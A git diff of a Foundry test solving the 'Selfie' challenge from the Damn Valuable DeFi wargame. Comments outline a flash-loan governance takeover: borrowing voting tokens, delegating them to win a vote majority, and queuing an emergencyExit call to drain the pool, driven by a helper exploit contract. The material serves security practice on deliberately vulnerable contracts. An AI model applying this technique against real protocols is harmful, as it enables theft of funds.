@@ -6,7 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
-
+import {SelfieSolve} from "./SelfieSolve.sol";
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -62,7 +62,16 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        // Flash loan voting token, call token.delegate() to increase the _delegateCheckpoints[]
+        // The governance allows queue action to be executed as long as the user's voting token is higher than half of total votes
+        // It is checked by the _hasEnoughVotes() function
+        // Calls the _votingToken.getVotes() which use the value in _delegateCheckpoints[]
+        // Then just execute the emergencyExit() function in the pool as governance permission
+
+        SelfieSolve exp = new SelfieSolve(token, governance, pool, recovery);
+        uint256 actionID = exp.attack();
+        vm.warp(block.timestamp + 2 days);
+        governance.executeAction(actionID);
     }
 
     /**
